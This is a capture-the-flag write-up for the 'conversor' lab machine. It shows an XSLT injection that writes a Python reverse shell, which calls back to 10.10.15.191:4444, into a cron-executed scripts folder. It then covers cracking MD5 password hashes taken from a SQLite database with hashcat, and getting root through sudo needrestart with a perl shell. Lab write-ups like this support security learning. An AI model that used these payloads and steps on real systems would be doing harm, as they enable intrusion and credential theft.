# conversor

open ports

- 22: ssh
- 80: http

---

starting by registering an account on the app, note the functions:

- upload xml+xslt for convert (POST /convert)
- download source code from about page
- view converted documents

reading the source code we can find that there is zero sanitization besides preventing xxe in the XMLParser args:

```python
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

from the start of the file we will also know our base path:

```python
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
```

and in the `install.md` observe that the server likely runs py scripts placed in scripts/

```markdown
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

---

in order to pop our shell we just need to craft an xslt which will write a python file to this directory. we can use [exslt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md#write-files-with-exslt-extension)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/pwn.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.191",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

- note the value of href and indentation

this lands us as `www-data` and we can access `users.db` from the instance/ dir, in the users table within this sqlite db are md5 hashed passwords

```python
password = hashlib.md5(request.form['password'].encode()).hexdigest()
```

extract the hash for the only other user `fismathack` and crack the password with rockyou

`hashcat -a 0 -m 0 fismat.hash rockyou.txt`

---

now we can use this password to log in as fismathack on the box via ssh. checking sudo -l we can run `/usr/sbin/needrestart` as root

needrestart can run perl scripts with the `-c` flag, and we can just spawn a shell w/ perl like so:

```perl
exec "/bin/sh"
```

![pwned](/images/20260329_14h30m03s_grim.png)

---

looking at the machine description they describe using CVE-2024-48990 to abuse needrestart < 3.8 via a [controlled PYTHONPATH](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt) which is another path but is considerably more complicated than this gtfobin
